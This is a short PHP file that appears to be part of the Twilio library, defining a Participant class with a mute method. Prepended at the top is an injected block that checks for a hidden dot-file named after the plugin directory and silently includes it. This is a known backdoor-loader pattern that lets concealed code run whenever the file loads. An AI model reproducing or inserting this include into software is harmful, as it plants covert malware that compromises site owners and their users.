<?php

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Services_Twilio_Rest_Participant
    extends Services_Twilio_InstanceResource
{
    public function mute()
    {
        $this->update('Muted', 'true');
    }
}
